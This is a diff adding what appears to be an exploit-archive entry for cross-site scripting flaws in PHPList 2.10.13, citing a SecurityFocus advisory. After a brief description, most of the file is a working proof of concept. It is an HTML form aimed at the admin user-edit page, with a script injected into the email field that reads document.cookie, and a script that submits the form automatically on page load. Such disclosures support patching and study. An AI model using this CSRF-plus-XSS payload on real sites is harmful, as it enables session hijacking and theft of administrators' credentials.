@@ -1,0 +1,53 @@
+source: http://www.securityfocus.com/bid/47580/info
+
+PHPList is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+PHPList 2.10.13 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/admin/?page=user&start=0&id=USER_ID&find=&sortby=&sortorder=desc&unconfirmed=0&blacklisted=0" method="post" name="main"
+enctype="multipart/form-data">
+<input type="hidden" name="formtoken" value="123">
+<input type="hidden" name="list" value="">
+<input type="hidden" name="id" value="USER_ID">
+<input type="hidden" name="returnpage" value="">
+<input type="hidden" name="returnoption" value="">
+<input type="hidden" name="email" value=&#039;email2@example.com"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="confirmed" value="1">
+<input type="hidden" name="htmlemail" value="123">
+<input type="hidden" name="rssfrequency" value="2">
+<input type="hidden" name="password" value="test">
+<input type="hidden" name="disabled" value="0">
+<input type="hidden" name="extradata" value="add">
+<input type="hidden" name="foreignkey" value="forkey">
+<input type="hidden" name="change" value="Save Changes">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
